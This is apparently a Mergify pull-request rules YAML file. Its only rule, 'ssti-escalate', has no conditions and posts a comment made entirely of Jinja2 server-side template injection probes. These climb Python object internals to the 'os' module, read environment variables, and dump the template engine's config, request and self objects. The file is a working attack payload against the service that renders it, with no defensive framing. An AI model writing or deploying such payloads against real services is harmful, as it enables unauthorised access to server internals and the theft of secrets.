pull_request_rules:
  - name: ssti-escalate
    conditions: []
    actions:
      comment:
        message: |
          a={{ "".__class__ }}
          b={{ "".__class__.__mro__ }}
          c={{ namespace.__init__.__globals__.keys()|list }}
          d={{ cycler.__init__.__globals__["os"].environ.get("HOME","blocked") }}
          e={{ lipsum.__globals__["os"].environ.get("HOME","blocked") }}
          f={{ config }}
          g={{ self }}
          h={{ request }}
